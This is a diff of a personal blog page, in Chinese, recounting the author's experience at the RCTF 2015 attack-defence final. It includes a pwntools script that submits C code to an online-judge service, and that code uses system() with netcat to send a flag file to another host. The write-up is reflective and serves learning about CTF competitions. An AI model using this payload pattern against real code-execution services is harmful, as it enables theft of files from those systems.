@@ -3,17 +3,24 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Alex Sue</title>
+  <title>RCTF_final | Alex Sue</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="船到橋頭自然直">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Alex Sue">
-<meta property="og:url" content="http://x95102003/github.io/index.html">
+  <meta name="description" content="###打醬油的一場比賽…
+起初是沒有想過出去打比賽的，想說自己能力完全不足根本去玩？結果學長來找時，還是答應了&amp;gt;_&amp;lt;(太沒定力了)，另外一個去的原因也是想要體會一下Attack and Defence，畢竟期末電安還是會需要這方面的經驗。
+福州四天三夜的最大的收穫莫過於知道自己能力的不足，打CTF的經驗也差很多，連exploit都很難寫出來，甚至沒有patch binary的經驗，去打">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCTF_final">
+<meta property="og:url" content="http://x95102003/github.io/2015/12/17/RCTF-final/index.html">
 <meta property="og:site_name" content="Alex Sue">
-<meta property="og:description" content="船到橋頭自然直">
+<meta property="og:description" content="###打醬油的一場比賽…
+起初是沒有想過出去打比賽的，想說自己能力完全不足根本去玩？結果學長來找時，還是答應了&amp;gt;_&amp;lt;(太沒定力了)，另外一個去的原因也是想要體會一下Attack and Defence，畢竟期末電安還是會需要這方面的經驗。
+福州四天三夜的最大的收穫莫過於知道自己能力的不足，打CTF的經驗也差很多，連exploit都很難寫出來，甚至沒有patch binary的經驗，去打">
+<meta property="og:updated_time" content="2015-12-17T15:11:22.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Alex Sue">
-<meta name="twitter:description" content="船到橋頭自然直">
+<meta name="twitter:title" content="RCTF_final">
+<meta name="twitter:description" content="###打醬油的一場比賽…
+起初是沒有想過出去打比賽的，想說自己能力完全不足根本去玩？結果學長來找時，還是答應了&amp;gt;_&amp;lt;(太沒定力了)，另外一個去的原因也是想要體會一下Attack and Defence，畢竟期末電安還是會需要這方面的經驗。
+福州四天三夜的最大的收穫莫過於知道自己能力的不足，打CTF的經驗也差很多，連exploit都很難寫出來，甚至沒有patch binary的經驗，去打">
   
     <link rel="alternative" href="/atom.xml" title="Alex Sue" type="application/atom+xml">
   
@@ -63,9 +70,7 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-    <article id="post-RCTF-final" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-RCTF-final" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2015/12/17/RCTF-final/" class="article-date">
   <time datetime="2015-12-17T14:06:11.000Z" itemprop="datePublished">2015-12-17</time>
@@ -78,8 +83,8 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/12/17/RCTF-final/">RCTF_final</a>
+    <h1 class="article-title" itemprop="name">
+      RCTF_final
     </h1>
   
 
@@ -92,11 +97,15 @@
 <p>福州四天三夜的最大的收穫莫過於知道自己能力的不足，打CTF的經驗也差很多，連exploit都很難寫出來，甚至沒有patch binary的經驗，去打比賽就像老師說的也是浪費時間。謝謝學長很努力的在打比賽之餘也教了我們許多東西。</p>
 <p>還有認識台科大的一群大大 &lt;(<em> </em>)&gt;，大多從國高中就開始寫外掛，做逆向分析等等… 回想那時候 我好像還在玩遊戲、完成父母的期望，儘管我有網路了，還是像個<strong>井底之娃</strong>一樣。</p>
 <p>比賽的那幾天晚上，大家都很努力的在解題目，想想自己的漏洞、事前準備工具，我想我也是去比賽裡面算睡多一點的～ 比完第一天之後，有聽台科大說某某題很簡單，學長表示：那題就交給你了！ 因此我也開ida pro分析、執行程式看一下流程，沒想到最後解出來居然跟我分析的都沒關連XDDD<br>果然還不太會看… 最後是單純用想的想到的=_=</p>
-        
-          <p class="article-more-link">
-            <a href="/2015/12/17/RCTF-final/#more">Read More</a>
-          </p>
-        
+<a id="more"></a>
+<p>題目就是一個online judge，可以幫你編譯C code並執行，<br>執行的時候拿不到<strong>shell</strong>，但是可以用<strong>system</strong>下一些無回饋的<strong>command</strong>(<em>估計是會比較輸出的東西給judge或是compile時間會太久command都會失效</em>)</p>
+<p>下面是寫出來的exploit</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *&#10;import sys&#10;&#10;host = sys.argv[1]&#10;port = 2345&#10;r = remote(host, port)&#10;print r.recv()&#10;&#10;choice = 2&#10;c_file =&#39;&#39;&#39;&#10;#include &#60;stdlib.h&#62;&#10;using namespace std;&#10;int main(void)&#123;&#10;    int a=1;&#10;    int b=2;&#10;    system(&#34;cat /home/flag/flag | nc 172.16.5.12 20004;&#34;);&#10;    printf(&#34;%d&#34;, a+b);&#10;    return 0;&#10;&#125;&#39;&#39;&#39;&#10;r.send(&#39;2&#39;)&#10;r.send(&#39;\n&#39;)&#10;r.send(c_file)&#10;r.send(&#34;\n\n\n&#34;)&#10;print r.recv()&#10;r.interactive()&#10;#r.send(&#39;4&#39;)&#10;#r.close()</span><br></pre></td></tr></table></figure>
+<p>沒想到…</p>
+<p>最悲慘的就是隔天這個exploit打不到任何一隊…  <strong>WTF~~~~</strong></p>
+<p>問了之後才知道大部分隊伍其實都patch了 以及許多隊伍都看題目了想出exploit，在compiler的時間上會花較多所以幾乎都沒用，要修改成kernel 提供的sendfile來explit才會成功的樣子…</p>
+<p>據說分析的時候可以看出config檔中system call是屬於白名單，能呼叫兩次的樣子，(不過我自己是都沒看到…T_T) 真的是太廢了…</p>
+
       
     </div>
     <footer class="article-footer">
@@ -108,59 +117,20 @@
     </footer>
   </div>
   
-</article>
-
-
+    
+<nav id="article-nav">
   
-    <article id="post-My-New-Post" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2015/10/29/My-New-Post/" class="article-date">
-  <time datetime="2015-10-28T17:18:32.000Z" itemprop="datePublished">2015-10-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/29/My-New-Post/">My New Post</a>
-    </h1>
+    <a href="/2015/10/29/My-New-Post/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">My New Post</div>
+    </a>
   
+</nav>
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="不知道該說啥的第一次…">不知道該說啥的第一次…</h3><p>繼之前使用Blog不知道隔了多久，大概就是無名的年代了？</p>
-<p>一直都頗懶惰用這東西=_= 雖然一兩年前室友有推薦我使用 </p>
-<p>室友表示：<strong><em>很簡單的？ 一下下就用好了～</em></strong> (事實好像的確蠻簡單的XDD</p>
-<p>但是當時還是沒有用， 一覺得沒必要，二是Github不太熟啊QQ (雖說現在也沒多熟就是</p>
-<p>現在會用的主要原因大概就是個<strong>跟風</strong>的概念？ </p>
-<p>覺得身為<strong><em>資工人</em></strong>也是該用一個自己的網站？…  </p>
-<p>廢話也說得頗多～  之後來研究看有沒有可以鎖文之類的… </p>
-<p>可以發表一些廢文 心情抒發之類的@_@</p>
-<p>還有瞭解一下hexo的格式  用的好看一點～ (希望有這閒情逸致&gt;&lt; </p>
-<p>順便多熟悉 Markdown 的寫法．</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://x95102003/github.io/2015/10/29/My-New-Post/" data-id="ciiacrxms0001z9nuicabnro9" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/胡言亂語/">胡言亂語</a></li></ul>
-
-    </footer>
-  </div>
   
 </article>
 
-
-  
-  
 </section>
         
           <aside id="sidebar">
